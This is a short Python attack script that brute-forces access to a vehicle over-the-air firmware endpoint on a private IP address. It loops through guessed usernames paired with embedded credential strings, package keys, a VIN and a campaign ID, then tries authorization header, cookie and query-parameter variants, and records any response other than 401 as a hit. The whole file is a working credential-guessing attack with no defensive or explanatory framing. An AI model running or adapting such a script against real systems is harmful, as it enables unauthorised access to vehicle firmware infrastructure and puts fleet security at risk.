import requests, base64, itertools
URL="http://10.225.139.3:8080/api/v1/ota/engineering-bundle"
CRED="5e7f07b4a81153ecd5868cc02557f823"
PKEY="3ac02bb40567fa14062cc768e22fefac3dd972aee87a3bf2d01419f026d573d0"
VIN="CV622697F82A936A1"; CAMP="CAMP-243892C376D4CB2D5F826953"
users=["cv6","CV6","ota","ota-client","ota_client","otaagent","ota-agent","fleet","cv6fleet","cv6-fleet",
"cv6ota","cv6-ota","tbox","T-BOX","t-box","engineering","eng","uploader","updater","update","flasher",
"download","bundle","package","root","admin","administrator","operator","technician","engineer","service",
"svc","backend","cloud","tsp","vehicle","vcu",VIN,CAMP,CRED,PKEY]
pws=[CRED,PKEY,VIN,CAMP,"cv6","ota","tbox","admin"]
found=[]
for u,p in itertools.product(users,pws):
    try:
        r=requests.get(URL,auth=(u,p),timeout=6)
        if r.status_code!=401:
            print("HIT",r.status_code,len(r.content),u,p,flush=True); found.append((u,p,r))
    except Exception: pass
print("basic matrix done, hits",len(found))
# header variants
hdrs=[{"Authorization":"Bearer "+CRED},{"Authorization":"Bearer "+PKEY},{"X-Firmware-Credential":CRED},
{"X-Package-Key":PKEY},{"X-Credential":CRED},{"X-Api-Key":PKEY},{"X-Ota-Token":CRED},{"X-Token":PKEY},
{"X-Campaign-Id":CAMP},{"X-Vin":VIN},{"Cookie":f"credential={CRED}"},{"Cookie":f"packageKey={PKEY}"}]
for h in hdrs:
    try:
        r=requests.get(URL,headers=h,timeout=6)
        if r.status_code!=401: print("HDR HIT",r.status_code,len(r.content),h,flush=True); found.append((h,None,r))
    except Exception: pass
# query params
for q in [f"?credential={CRED}",f"?key={PKEY}",f"?token={CRED}",f"?packageKey={PKEY}",f"?vin={VIN}&key={PKEY}"]:
    try:
        r=requests.get(URL+q,timeout=6)
        if r.status_code!=401: print("Q HIT",r.status_code,len(r.content),q,flush=True); found.append((q,None,r))
    except Exception: pass
print("all done",len(found))
